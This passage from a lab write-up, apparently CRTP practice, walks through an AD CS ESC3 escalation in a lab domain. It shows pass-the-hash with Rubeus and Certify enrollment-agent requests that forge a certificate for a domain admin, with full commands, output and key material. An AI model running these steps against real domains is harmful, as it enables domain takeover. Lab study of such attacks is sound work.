                                      TECH\Domain Admins            S-1-5-21-1600556212-896947471-994435180-512
                                      TECH\Enterprise Admins        S-1-5-21-1600556212-896947471-994435180-519
```

**`FIDOUsers Template - Enrollment Rights:`**

```xml
    CA Name                               : tech-dc.tech.corp\tech-tech-dc-CA
    Template Name                         : FIDOUsers
    Schema Version                        : 2
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 1
    Application Policies                  : Certificate Request Agent
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System
    mspki-certificate-application-policy  : Client Authentication, Encrypting File System
    Permissions
      Enrollment Permissions
        Enrollment Rights           : TECH\causer                   S-1-5-21-1600556212-896947471-994435180-1109
                                      TECH\Domain Admins            S-1-5-21-1600556212-896947471-994435180-512
                                      TECH\Enterprise Admins        S-1-5-21-1600556212-896947471-994435180-519
```

We can further verify this by checking `causer's SID (S-1-5-21-1600556212-896947471-994435180-1109)` which is explicitly listed in the FODO template ACLs.

```xml
PS C:\Users\studentuser\Desktop> Get-DomainObjectAcl -SearchBase "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=tech,DC=corp" -ResolveGUIDs | Where-Object {$_.SecurityIdentifier -eq "S-1-5-21-1600556212-896947471-994435180-1109" -and $_.ObjectAceType -eq "Certificate-Enrollment"}

AceQualifier           : AccessAllowed
ObjectDN               : CN=FIDO,CN=Certificate Templates,CN=Public Key
                         Services,CN=Services,CN=Configuration,DC=tech,DC=corp
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : Certificate-Enrollment
ObjectSID              :
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1600556212-896947471-994435180-1109
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0

AceQualifier           : AccessAllowed
ObjectDN               : CN=FIDOUsers,CN=Certificate Templates,CN=Public Key
                         Services,CN=Services,CN=Configuration,DC=tech,DC=corp
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : Certificate-Enrollment
ObjectSID              :
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-1600556212-896947471-994435180-1109
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0
```

Now that we’ve verified it we can proceed with the `ESC3` attack.

Now we `request FIDO enrollment agent certificate for causer`.

Instead of trying to impersonate causer from TECHSRV30$, we need to **authenticate AS causer** using pass-the-hash.

When we try to run it as `TECHSRV30$`, it fails as it doesn't have the necessary enrollment permissions on the FIDO template. So now we move back to the `STUDVM` to continue with the exploit.

```xml
PS C:\Users\studentuser\Desktop> .\Rubeus.exe asktgt /user:causer /rc4:99864b36ef401ee5f15d64e3d4fcd071 /domain:tech.corp /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 99864b36ef401ee5f15d64e3d4fcd071
[*] Building AS-REQ (w/ preauth) for: 'tech.corp\causer'
[*] Using domain controller: 172.16.4.5:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFRDCCBUCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQsbCVRFQ0guQ09SUKIeMBygAwIB
      AqEVMBMbBmtyYnRndBsJdGVjaC5jb3Jwo4IEIjCCBB6gAwIBEqEDAgEEooIEEASCBAylsWDrYmjw9tsZ
      oTBfB/N5q7wbSJSDTpvGWCYrAZMcHzxsM2hES3CyIrPtQX8sgJEKCm/MKKhtcdNb3rcrfDFBjKUSENVR
      MrvAwokVRJHBlUCEknNOuZ1VSWIVGJWa+FhkYF8bK14XZue7Har7MocDBtoK4KwaL2AB+MM7CFFIwfCn
      agk1zOwh2hKSEstLuV34Airtm/IbJVTlsRuCMLrht+mNXPbLXtBeH2d7eiBfEe+UwWzUnwUa8EhlybEi
      XBEsclfmD1ky86J1WixCkDwewAKXLPik///sjNW1Rt3IGe9vuTytFN30yrph8cK1lLvJj8/5Sft80JML
      dtzH8MiO/un+/MO7g++xePj0LTyMsm+1vyY6rqOiXfDZS2OBsBeapcQklBoHdoNX6RkFKgt2m1XvyDB/
      AYiNll6WzVHm0e8Aupb0j/2AbsrscNA8qQCiXwUjknhGHHv28kfGMnjrAGTeRcsR40erwOL6+F3DhgE+
      lUVXbHwcSMlgQAJRn7Y4ZiQUxHSV6LvtwWin2FEc/g4Igq72qNvsLff8T6LRlA1/HO/MBktIEweVcLlw
      d0WS59ElzoOML48jUcuTkm8col+IL6hmss/q0j4x7TcnIMNaO4RGjmrrdBS57WMez87TuuSIoL78hQZU
      ZO8tdn33u4HubWfDtKAwJ3v0FkwZpBHw2IIEBHBsV390axhp4KkvqDczoUpR9u+sZQsPcpTc/2y+SOt/
      F5B7K8hYTSPzWDsfOpT7gi8MAEeEjuL+DCrMIurXAQLB5JT54ahZJHRm2cHJptv02RRaAKxQPGznIlHN
      kGUzpiX2D7mswSQVdtbcfJum484dDWavdDdcWAHatsLzdFjRQYECuCKYMQGwSiRxXpebvkkqQyZVUtRQ
      HRzsdVzTvA1vcmkSk96s0AyLALwmyGo2j7JuNFI6aysKzss+GzXwOV529xVF4xiMWDLiHEqPW1/wEMON
      5Xz5/mRaKd5bWAwaqBAWo8t0idF+3yIAYn0YB28kJnnVdPJTt6TK4stKdTpHKOJVaMa0s8xxhzFnn7Yn
      CxzeBYDa+oFbJ27AxfeiRx1BxcOaC73PbfiBD119huE84WputMVgg64F9yFhO2pPKwNFpCLabODeznx7
      e3WvJ0GmMIz7LjouVXCVuuAMGnzNzwH2vf5gaUz/Cq9h4alaZFcDX8jBqoGr+rpKyGafUF4zrajI8Z8M
      yHAN6ZqjgDhZamtdmQGlsxF6z83LFSYy2AZjpAkUY5dAHvyofL9Nr5z1tuO8sOg4vJ2NzixEK98MpPdY
      BUu4/TP2cgw5fScjbewQ4DJ4wlol4Oy8VAfWpoXXEO5p4dbW+7zcvNb1taLhojio+LnuF7pVgjtNfWr8
      BXzAMUJXo4HLMIHIoAMCAQCigcAEgb19gbowgbeggbQwgbEwga6gGzAZoAMCARehEgQQD3kwtxEYTZ9o
      UCdlbgDDBaELGwlURUNILkNPUlCiEzARoAMCAQGhCjAIGwZjYXVzZXKjBwMFAEDhAAClERgPMjAyNTEy
      MTAwNDAwNTJaphEYDzIwMjUxMjEwMTQwMDUyWqcRGA8yMDI1MTIxNzA0MDA1MlqoCxsJVEVDSC5DT1JQ
      qR4wHKADAgECoRUwExsGa3JidGd0Gwl0ZWNoLmNvcnA=
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/tech.corp
  ServiceRealm             :  TECH.CORP
  UserName                 :  causer (NT_PRINCIPAL)
  UserRealm                :  TECH.CORP
  StartTime                :  12/10/2025 4:00:52 AM
  EndTime                  :  12/10/2025 2:00:52 PM
  RenewTill                :  12/17/2025 4:00:52 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  D3kwtxEYTZ9oUCdlbgDDBQ==
  ASREP (key)              :  99864B36EF401EE5F15D64E3D4FCD071

PS C:\Users\studentuser\Desktop> klist

Current LogonId is 0:0xe07fd

Cached Tickets: (1)

#0>     Client: causer @ TECH.CORP
        Server: krbtgt/tech.corp @ TECH.CORP
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 12/10/2025 4:00:52 (local)
        End Time:   12/10/2025 14:00:52 (local)
        Renew Time: 12/17/2025 4:00:52 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
PS C:\Users\studentuser\Desktop> .\Certify.exe request /ca:tech-dc.tech.corp\tech-tech-dc-CA /template:FIDO

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : TECH\studentuser
[*] No subject name specified, using current context as subject.

[*] Template                : FIDO
[*] Subject                 : CN=studentuser, CN=Users, DC=tech, DC=corp

[*] Certificate Authority   : tech-dc.tech.corp\tech-tech-dc-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 9

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA60IgwhDGftZ6x3X540ARLe/s7alGu3W+RQe9/Z4iou5Z6Q8y
EjeGN0q7NdS9MCDX/bivpjHqNZ0GiKUmE7yCEky1jMXxw1YvGq0ePt2GpqpFUYcs
AvhB8AWHfDcekpUPnBGxeu1+O4uQhnBJCUwuuY3q+B/iezpnUiRdPTFSwsAXxp0x
jBUfgnDPqaaGCbpSNmF7x4rmTQPx21B+hjYtERs/0YlD7H3F4xWUn2QKMCJVeqlg
mlNwB5C/51TtM53VsMJwIyZUAXVihfuRPVfukVQUYHhKPbQ3cM4URVVnRi63j3ki
rXtEKigeNu6bjHDW51qU79VRDUgOyAGi7q5KYQIDAQABAoIBAQDNUfhfBt8GIdAk
No2xzN9xdR0Vyo/l2XwGqRwitZnLEzS7F7z+cyEbLoi3EYVP9MotMLtz08pxoirq
pR/XR8VJjVNBmhxG+/e+U2q7OQFkgeRfpBZAPUTm4xx8x2pSSe/GqRZ5j76E32hy
PJsxlyCMZxS0GrfCDpXP9da+KkbtmaaIG9xzUzkunL2nztYMqDwP8FkIsc3m38J1
whtPm5SJ8kpiktckVdAx1aKMZvYgnLEWZX+7rT594kpWTNOO9YBNuuKm9pC6dxwv
dwpLHgLbuKwWB2DNNzqIRyo3XEoYeGts/lVjpxraA17RjLznaxgCN7I3BDg7UeMF
uyADLVyFAoGBAPSvlcUXJZ9PVzaHsn8LXRQ59RTVz0VVNrdsRdKorIewKSnqlh8+
G0dbLnhA0k7lFjc1x8NL4Q4sib/9Cu3dgNvhgNK39v+6y1LIP2WimHW8odSLp3+1
Q6ROnoS0HvL1OHJLfFiyR7F8jyacSlRSKyX0nvOIBj4BY4zGs7zRUgwTAoGBAPYi
8jlVdYCzngaW3wzRn45lkO7y8AhkClx0xu4wPueXOVRG5UdWEbs11yqcccEhpt+Z
XhpIQuuovj/rnhxpcHKS0Jdhro763jgVRDZNBBzC3fFL5448w3LzWAYgtArIjU43
GlKjwZ9SVNHulQOMiWTj5IO90Ckwqjfu2HlZELY7AoGBANy+Gyu3eiWC+ncjbJDY
u5wnvUaSrW8rNTW85DDsIto2vqwmClEdQpbZV879C75JRgWA6zrxFZQn8g3WRynY
jwvPINz5QkfrSMriBO+4BDsTdhu98dpwuRleI/wsU090kvvpxcBu9ebVLH/0t8ni
ZzLSwSOLL7Z4okq6aCSL4q0pAoGANs2RITLl9sIHbXAqObBy1kHHA20UBMpBhFR7
9ozHdMk2+ozOgBOp3wUd417x9Q6JGUAMs81jGRV5RsIvciQH5XrK9unI9AznbZVO
msiLIdxBjnhYFlNxMSb9cl/VtpDw5XlfYwcTFWY/fH6iryebb9tOBgc9Ue6D9/A2
Qs6R6gECgYAclb/+UecOfoIrPgx21YRLaiCCCSKXOhb/HZHgs/rrle9uDSsFb8tu
hUsCOD8F/Uy/X8TXxbb29hUVMocXF3ch60gRfLB4Z97AY67b0s/Jk77wN+Vl09eo
qIZCkuLmkb/cvwkhfhLy0ymk0mwrAjHYuFsURwwFXzg+yfRjOxV5dQ==
-----END RSA PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
MIIF+DCCBOCgAwIBAgITegAAAAnGn3/nkcXLbAAAAAAACTANBgkqhkiG9w0BAQsF
ADBGMRQwEgYKCZImiZPyLGQBGRYEY29ycDEUMBIGCgmSJomT8ixkARkWBHRlY2gx
GDAWBgNVBAMTD3RlY2gtdGVjaC1kYy1DQTAeFw0yNTEyMTAwMzUxMDRaFw0yNzEy
MTAwNDAxMDRaME0xFDASBgoJkiaJk/IsZAEZFgRjb3JwMRQwEgYKCZImiZPyLGQB
GRYEdGVjaDEOMAwGA1UEAxMFVXNlcnMxDzANBgNVBAMTBmNhdXNlcjCCASIwDQYJ
KoZIhvcNAQEBBQADggEPADCCAQoCggEBAOtCIMIQxn7Wesd1+eNAES3v7O2pRrt1
vkUHvf2eIqLuWekPMhI3hjdKuzXUvTAg1/24r6Yx6jWdBoilJhO8ghJMtYzF8cNW
LxqtHj7dhqaqRVGHLAL4QfAFh3w3HpKVD5wRsXrtfjuLkIZwSQlMLrmN6vgf4ns6
Z1IkXT0xUsLAF8adMYwVH4Jwz6mmhgm6UjZhe8eK5k0D8dtQfoY2LREbP9GJQ+x9
xeMVlJ9kCjAiVXqpYJpTcAeQv+dU7TOd1bDCcCMmVAF1YoX7kT1X7pFUFGB4Sj20
N3DOFEVVZ0Yut495Iq17RCooHjbum4xw1udalO/VUQ1IDsgBou6uSmECAwEAAaOC
AtYwggLSMD4GCSsGAQQBgjcVBwQxMC8GJysGAQQBgjcVCIe2x3yHsNJKhc2fAIff
j2WBjP5ggWeEmd4Vh5zSRwIBZAIBAzAVBgNVHSUEDjAMBgorBgEEAYI3FAIBMA4G
A1UdDwEB/wQEAwIHgDAdBgkrBgEEAYI3FQoEEDAOMAwGCisGAQQBgjcUAgEwHQYD
VR0OBBYEFL/58Kg76h9KM6v6lLjNy21HowiQMB8GA1UdIwQYMBaAFBdmrJWoiwoZ
zysu5MsE7lwbEu3sMIHLBgNVHR8EgcMwgcAwgb2ggbqggbeGgbRsZGFwOi8vL0NO
PXRlY2gtdGVjaC1kYy1DQSxDTj10ZWNoLWRjLENOPUNEUCxDTj1QdWJsaWMlMjBL
ZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9uLERDPXRl
Y2gsREM9Y29ycD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/b2JqZWN0
Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgb8GCCsGAQUFBwEBBIGyMIGvMIGs
BggrBgEFBQcwAoaBn2xkYXA6Ly8vQ049dGVjaC10ZWNoLWRjLUNBLENOPUFJQSxD
Tj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1
cmF0aW9uLERDPXRlY2gsREM9Y29ycD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0
Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTArBgNVHREEJDAioCAGCisGAQQB
gjcUAgOgEgwQY2F1c2VyQHRlY2guY29ycDBNBgkrBgEEAYI3GQIEQDA+oDwGCisG
AQQBgjcZAgGgLgQsUy0xLTUtMjEtMTYwMDU1NjIxMi04OTY5NDc0NzEtOTk0NDM1
MTgwLTExMDkwDQYJKoZIhvcNAQELBQADggEBAAReYxTxDsPvUAaqAx0an5wb56Nn
nZeW96hGmU5jtVD8ZjBZICBxqnz8wMqVVKDFN/le+kEn3HGB1DOCZGOCf0RpQV9s
l5JevN2shVaPU2gmUYDIDOE2WmbZjoqUf+4sVI97WcUdxlIc6Obb5r8C1mhuqK9Z
ObrlzT7ODdRGjekDpqDr5SCBupLhlje//G9Zx/76CR8Ge8pfL8uphF12/VUchJb+
iaul00AmBw06rAkYQQMmyfSf7QaIJh+570i4uCwSm+iuZy/vMf8qVhBilqNuBzK1
XmfULH0bp5I6Rgg/CldEnxKZfq7p+DOOp7GcVRG9lHzqmcdNWAgDBn8Z5yQ=
-----END CERTIFICATE-----

[*] Convert with: openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

Certify completed in 00:00:19.2011710
PS C:\Users\studentuser\Desktop>
```

- **Purpose**: Enrollment Agent
- **Format**: PEM (RSA private key + certificate)
- **`Request ID**: 9 (successfully issued by CA)`

**Understanding the FIDO Enrollment Agent Certificate**

We've just requested and received a certificate from the FIDO template, which is a specially configured certificate template that grants the "Certificate Request Agent" Extended Key Usage (EKU). This is not a regular user certificate - it's an enrollment agent certificate, which essentially acts as a credential that allows its holder to request certificates on behalf of other users in the domain. The certificate we received is issued to causer (Subject: CN=causer, CN=Users, DC=tech, DC=corp) and comes in PEM format containing both the RSA private key and the certificate itself. The Certificate Authority successfully issued it with Request ID 9, confirming that causer has the proper enrollment rights on the FIDO template.

**Why This Certificate is Powerful**

This enrollment agent certificate is essentially a "golden ticket" for the entire certificate infrastructure in the domain. With this certificate in hand, we can now request certificates for ANY user in the domain, including high-privileged accounts like Domain Admins (techadmin). The critical vulnerability here is that there are no restrictions on who we can request certificates for - the Certificate Authority will honor our enrollment agent certificate and issue certificates for any user we specify. This bypasses normal authentication requirements because we don't need to know the target user's password or hash; we simply present our enrollment agent certificate and request a certificate on their behalf. Once we obtain a certificate for a Domain Admin, we can use it to authenticate as that user through PKINIT (Kerberos authentication using certificates), effectively giving us Domain Admin privileges without ever needing their actual password.

Switching over to a local linux machine to access `openssl` and convert the `PEM to PFX`.

```xml
┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CRTP/New]
└─$ nano causer.pem

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CRTP/New]
└─$ file causer.pem
causer.pem: PEM RSA private key

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CRTP/New]
└─$ openssl pkcs12 -in causer.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out causer.pfx -
passout pass:

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CRTP/New]
└─$ file causer.pfx
causer.pfx: data

┌──(abu㉿Winbu)-[/mnt/c/Main/CyberSec/CRTP/New]
└─$ base64 -w 0 causer.pfx
MIINXQIBAzCCDR<REDATED>
```

Now copying the `base64` data over to `STUDVM`

```xml
PS C:\Users\studentuser\Desktop> $base64 = "MIINXQIBAzCCDRMGCSqGSIb3DQEHAaCCDQQEgg0AMIIM/DCCBuoGCSqGSIb3DQEHBqCCBtswggbXAgEAMIIG0AYJKoZIhvcNAQcBMF8GCSqGSIb3DQEFDTBSMDEGCSqGSIb3DQEFDDAkBBDqf4vQJul0/wjll97DPBVhAgIIADAMBggqhkiG9w0CCQUAMB0GCWCGSAFlAwQBKgQQ1pYHjgKKrHnADe6qPmNj1oCCBmAFZnGmJFOreWXbMlgXm1vZdy8WOJhtc7Won1CEJdDfYX0jUQpuZu5Q0e1u83RucR8KNW30Yh0ZrRPd5LeCwjXR/jI0FQJYjs+5xOrkaKyuAr48U4fuSjG6JXrw3dNiTwc9tJGAS+o+iOy2N5BoiXQzrnSn+VOImiWfEu/94TSXsfy5kiIzIAbvVb+8M3cRheb5BlJcQORgod5Akzpz/E3wLN6uA+8egH8uzekWZ4nCHuQmhX8aHcjFqb4enTMqIybXNs4KQAxUVWy/IGiGe2qa6i6slRPc5Vgzo4xZ9a+jVTgX0f14Aq1tgrlj5Og6v2hfzB9etX2hUXJoU6s58MgZkBofDyfE+rVG95LetZQHNC2QpJOh6yBX4Aachv6Y0lyDlL/lKUJ5QrPN+wEi6IM7ixAHM7H4k0cID5o7EydxnKW0xei7Nl2t8fxh9O1xC9Vbw3VBDejCVxWIeO8p4CNZALRN9wFd95LLqD76wvyN3dXseVdoVPZ0Q+SVvmUxEz9rm75nYsUcK5LJm5++bLe1vFR/aqHyRpEx4YF8v5VHOMlRHq9kF7lj7Z71iI/qBgC0MO6iM+Esm1Hwa4D0N1jTzqpipiQ9i3FiWorIlFu9+0E1Qf/7BuElqT09p64aKRw4NN0NaSjK0VVuK7Arv2aV1apSM1hWHEE+jwSJhyZkC7bsTQBogqolPg2R58JY9jwIdLoYUchkM/DzCAsH8mmSAwikQ6ARCWZY/loP7DY8XcAlvU62FoxFTbHe66ADU4VfVbuqAYnLcKH0NyQH+S4NNPvFSFPYRriZ/Hcg4kqXNWzsJ76VFtDgCPaYoe2opGnXvxSmuBneV+ux83b4+WhjFcmy/E9QNbNv1VMMnzvJKC8sYeTxGeXKGTTR/EKZmwYN/s2eoxr6ipvyC2mfjgiW2JGgubVopzifHS274CHbrI1OFf2bMQip9Bl6QRpIncFfMKCkD0ScXZ0ICFEejhhj4WU8V5u8z98DiJBBit6YkDwNXBiaVA5JIbMY8zynMtDR04ceLS9PQ4anMzDuULJtbmYto8h7jZi9DBZSon36EtfJ/vpidIGGzo4MfM7cQLr+z4iZEPerGuuA2aKuh1wtbbPG0vlv4yd66Y6z3DATvN5JVkQVj2ebjkCly2N+12S28q7MY+TAVKvclQIkf6E/qsEOqeDa91sK0SWFCfXj9RpNMvftkiVwT+isapbFTRshRF7tTl41JpUCycS4VlHK9302qA+ZfKc0KoWt40PKv8ql6bn7SR2/Iv1kUAFRZacLeqDBslPrqNq6seWjvN5bn9Z9hcMgcHbRexfHPxos3aBy5tixl8QrC9tIqWZDWv32FbmEwJNY4/J6Y9kA0PtEUHN3zW9HvhXoVuVawp+KYanhGvv7bDBPEGxQ2gzw7rHvh65W2XZtKS0gjPLCT2p33ml7ppdwETlc75JNQnZZDw8Ho2Kag63oqgcTXeEHBpmrbyp/uj5FgziTE1/5Q1gkm8kiOs3d56lXdrIWPUQ2g3RyCBrAnvuhRyUrbj3nri2mJ7eiElmPDfRkFv4vW3cwv3AxLFserLQclhpfsWywG27z9Z2CbFlo6RCYWN5EMlmQrzwEekAB6hG1uCOrJjHjBrTK3ZaUdeJkrPF3cPPtbb9l0LKsBrfCV8Bz5QD086gI9ktsbzmRsTUytHWvxJceXKkw2IMOeLRGZXUVVwErcJeZQ/0qVVKg/650USnqIhhy20VIl4wVQijmaI6frm7iEGzauIJLXd9bNMRyKJkQynXA0bX3yN8/LYC1V+oDS+U1U9nMiNwtlgfNRdZ9pVp/05FGmxJfwIDA08Wd6rcrtg8uxQOV/R4lpPLEnCIph3KtXspctLdcN9+tiLleZnppyNtt0UPtW04bSsOYyXc0f4hOYgxKB4p8rw7dLsYy6UZrHPlzZc7ajVwyVLdzsn3tueYt8TJVaJGfsZBoMUOc6OLUFFcA1xKp4avZlnB1NejFvN6+SQlEoWHIs3Eg2HZ0y1BtLYFCL7W3vxU7nc/KFd0AXjzJ5DnPSP1oQTE5Hm4eGdEAWe4s6gvT606ei02G63pa8l28Xk5Hg3O1AB2Ncp4IvbNIQxRNsXCSofCkfOrzqHtvKvbmlrss7nV1pd1vtPFF/niBDj3PBVFrcQ5cFVZiHru5qGQ2ds2dDkpEigEwggYKBgkqhkiG9w0BBwGgggX7BIIF9zCCBfMwggXvBgsqhkiG9w0BDAoBAqCCBUkwggVFMF8GCSqGSIb3DQEFDTBSMDEGCSqGSIb3DQEFDDAkBBC6GZFz6dq/y64yw39XqKoWAgIIADAMBggqhkiG9w0CCQUAMB0GCWCGSAFlAwQBKgQQmWZcl3yDXANlZmld/Ik97QSCBOCpl2OuWrsj4GDClrOnOq+QopeK0S5l4YjN3ypjO5f7fDEwJTiCs/KtRCWQuNtnKu3x4jjctJ/hsYo6is/UFh2FTdvn5SYqV3YeIeRCmN8tUb14hEDiemXpgq8pgI7pJzhiS9wxqd8Nh0WLEngGtz0ZLkjJPQU90H+B/AQZhWoTtrfpeeJk8bfLjDaBscii6JOWbdR54VGEMVIQcUlGPzBt/q5U8Hgfnq0bj/TWtXjv4AlhQSH9gEXBhkrUqrt898B7izGAytos6mcsZUCrhaLslN6MR/spmDBYlXZA4q7lCJnRDi1br4La4nxZw+QTUOcukiu1oVe0M4ZoeIB7UB8tMWlTuCuJFKMBnIc06i8+UcUcKgyLa+aV0nfcIxEOlrRBRb8Wa6kUpyCY2ysQlVHq2I9TMgFA1M1KFdLF9BlITMh0jRK9kvvTTuLdaGP8yYZ8wwX/dekXd5ZIY+3ceXPrGLRDf+1pdvqtbKPfzIxnfYTHzZWntYJp2QrzJOLqkh7Opu2YjEYNy5YCqFCQmxNyd3XyLBr9ptvBlADdk5900FzQc6yx8JXj0k7DYv/Pg5WfgfrEsqWH0TCvrbmT76h/XgamTLZ6Raek+L81N0w6dGc4uuvMy5KR7UMqy8l8+VFTYc0hIxUWmZZOT9gx/DtNukrpJin8v+hiFJYY/BMTROXJ7jWBVZDhVIA0kvK0lcUsGuNpSQPcDRREirx/Of7LEDA0204iZ+wMZKi357OlVkYDu96gGudCAhD1PPfNhQbIgPgIgzDoCtHwUfFvdiQrjIpNA0Rj7dBjqSN2tWhxTSVGktLY+V6sJg4+gOF36msrhBnr/DTZ/PbyrBH0TKYybjHXom5GQH2hfgxgEER4LX2wXnJpjW4iRfKuP0GizWTqcgcjyANDe+xXTCs/guSbJWlH1oNBZSl5Rtm+jMoNgKGcaYgN4lr6G6FPX82sn3rOBvGjvR+yE1b/gKKmCFffT3ynEbd6LQxqPg8z1Jaznn9pFbCP/E7skifskL7KYQ50s68rKWxBsch7oIoG+f9HkazrchBCmOg9P3V5fAJyb92JStf7JNjkv2gCehAd3KNKvdKs7ygLoiKB/0EOaraF0j/taRvDWeL5KJQPZcY+jEFoEEkSAdis/DQMXwMqSzhmSKSH6C2o9qhaQA/RBHwwvUjHL+01W8SREQIq4KZqeMYrGyIrfa1LpRVdtih+MWx2bR/Z0/YpzELbcF/fzwroUHIvsEB9eQTt3iPsu5V+g7Ry+4dGMqfkgAJpjzlMF+lcuq7zPkoC/apym90Y4bon2k4vynIsxMXrMIUsCyMmqb4pBJsf3ZLiqcrdguR9tQq1O4twgvNtMiCdIZJd9sr6YLr5so1J6af8Zll8uGYXKC4C4Sc2FyeJ2w+M9GXUZuX+//IMKHBmRPEMBTrXGyT8bJw4Zgps+zM9KgYlEjdMP073g2cgEL4J+KgRHtpReEGw6swUr/uO4l0tmoCegM5Ku6mApYpXKw59FfU5ev+bkuPn62IaWvOfksx042CmizudwJGlRzSn0g7ID940EaSPgNlK5EeD0vAi9lIjX0sVWa5UbkxI1Ug+NcVwtA/omxVZ8kwZhx6NlwyqOy121Krhecmkjc6TMIghbRCO2ZIsDPHD5CjxjyePSoRbJhZtAAcxgZIwIwYJKoZIhvcNAQkVMRYEFA3Vgrg20ocT7bTa/MXPcEbPxMUFMGsGCSsGAQQBgjcRATFeHlwATQBpAGMAcgBvAHMAbwBmAHQAIABFAG4AaABhAG4AYwBlAGQAIABDAHIAeQBwAHQAbwBnAHIAYQBwAGgAaQBjACAAUAByAG8AdgBpAGQAZQByACAAdgAxAC4AMDBBMDEwDQYJYIZIAWUDBAIBBQAEICwciMwXof3ofx+N9chG1cq3iWsy+baSWZNDpZpNo7ZoBAgkVFYDZlOJrAICCAA="
PS C:\Users\studentuser\Desktop> [IO.File]::WriteAllBytes("C:\Users\studentuser\Desktop\causer.pfx", [Convert]::FromBase64String($base64))
PS C:\Users\studentuser\Desktop> ls C:\Users\studentuser\Desktop\causer.pfx

    Directory: C:\Users\studentuser\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        12/10/2025   4:28 AM           3425 causer.pfx

PS C:\Users\studentuser\Desktop>
```

`*Request a certificate for techadmin using the enrollment agent certificate*`

```xml
PS C:\Users\studentuser\Desktop> .\Certify.exe request /ca:tech-dc.tech.corp\tech-tech-dc-CA /template:FIDOUsers /onbehalfof:tech\techadmin /enrollcert:causer.pfx /enrollcertpw:""

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.0.0

[*] Action: Request a Certificates

[*] Current user context    : TECH\studentuser

[*] Template                : FIDOUsers
[*] On Behalf Of            : tech\techadmin

[*] Certificate Authority   : tech-dc.tech.corp\tech-tech-dc-CA

[*] CA Response             : The certificate had been issued.
[*] Request ID              : 10

[*] cert.pem         :

-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEAzZiTPDo2Y6E/eyzSJQLPDFIMxXmY3YMX6AuQNPVPMh6q/lqQ
UG0MZS9yDwM1ORBIx6lclbKMcEf2MA8Hx2Oit6cKZ16SoiqmENAA+4vCZF1lAgEl
LC89kCmq/ImeVMZmqTlPr4WT43QxSsGOFGrEec1zCwu0VAjX2TFfhMDpmdhECygh
BXYtq90ZmKKbxXyrP4t4VN55Bq3fp82bRPvPZKCHe+7KjFkWFLuZukQPkJ2wPEvJ
rt87jD66fQrLlUU/hnD8PU+dXw59VEK0QvsXivfIgv5GKKiKHg+5EBvhLqsPzPl5
hN/GJ9Kr85klQXRWFCVoqUKnx62J5H7Xhh3/ZQIDAQABAoIBAQCJPEk7sJfRlTbs
n5R+hAt06+f+gRZa9kCk8eMGlqCQkgwN0KH4LXJSsILwJnIGbypFrHVSr2YzJLXe
ionkvEtHT8cQDP7QJKvJGS8uubG+kOD1n5ISlk3/xvCNtcbsS6sHVmwse3umHk8w
